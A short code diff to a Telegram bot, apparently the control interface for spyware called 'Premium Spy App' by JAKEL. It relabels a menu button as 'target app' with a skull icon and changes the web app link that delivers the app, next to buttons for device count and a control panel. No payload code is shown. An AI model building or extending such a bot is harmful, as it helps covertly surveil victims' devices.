@@ -185,7 +185,7 @@ bot.on("message", msg => {
         reply_markup: {
           keyboard: [
             ["📊 عدد الأجهزة", "🎮 لوحة التحكم"],
-            ["👨‍💻 معلومات المطور", "/app_link"]
+            ["👨‍💻 معلومات المطور", "🗃️☠️تطبيق الهدف"]
           ],
           resize_keyboard: true
         }
@@ -193,7 +193,7 @@ bot.on("message", msg => {
     ).catch(console.error);
   } 
   // الأمر الجديد: /app_link
-  else if (text === "/app_link") {
+  else if (text === "🗃️☠️تطبيق الهدف") {
     const appMessage = `
 <b>🌟 Premium Spy App - Developed by JAKEL 🌟</b>
 
@@ -239,7 +239,7 @@ bot.on("message", msg => {
         inline_keyboard: [[
           { 
             text: "📲 افتح صفحة التطبيق الآن", 
-            web_app: { url: "https://jakel69.github.io/premium-spy-app" } 
+            web_app: { url: "http://t.me/JL_HK011101Sbot/JAKELspy" } 
           }
         ]]
       }
